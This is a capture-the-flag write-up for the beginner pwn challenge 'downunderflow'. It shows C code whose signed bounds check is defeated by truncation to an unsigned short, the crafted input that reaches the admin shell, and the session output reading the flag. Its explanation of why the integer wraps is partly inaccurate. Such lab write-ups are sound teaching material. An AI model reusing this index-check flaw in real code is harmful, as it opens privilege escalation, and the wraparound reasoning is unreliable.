# downunderflow (beginner)
It's important to see things from different perspectives.

Author: joseph

nc 2023.ductf.dev 30025

## Files
* downunderflow.c
* downunderflow

## Solution
The program asks for an integer input to get the corresponding user from an user array. The last user of the array is the admin user.

There is a function that checks if the input is out of bound. The bound is the length of the array minus one. So the last user is not accessable:
```c
char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    init();

    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }
}
```

But there is not check if the input over- or underflows the limit of an integer. From the _limits.h_ we know that those limits are:
```
INT_MIN	-2147483648
INT_MAX	+2147483647
```

So if we increase or decrease the input over the those limits, the integer starts again at 0. We have to input the number that over-/underflows to 7 to get the admin user:
```
$ nc 2023.ductf.dev 30025
Select user to log in as: 2147483648
Logging in as user0
Sat Sep  2 12:37:22 UTC 2023
$ nc 2023.ductf.dev 30025
Select user to log in as: 2147483655
Logging in as admin
Welcome admin.
ls -al
total 28
drwxr-xr-x 1 65534 65534  4096 Aug 31 02:12 .
drwxrwxrwt 8  1000  1000   160 Sep  2 12:26 ..
-rw-r--r-- 1 65534 65534    31 Aug 31 02:12 flag.txt
-rwxr-xr-x 1 65534 65534 17280 Aug 31 02:12 pwn
cat flag.txt
DUCTF{-65529_==_7_(mod_65536)}
exit
$
```

Our flag is: `DUCTF{-65529_==_7_(mod_65536)}`
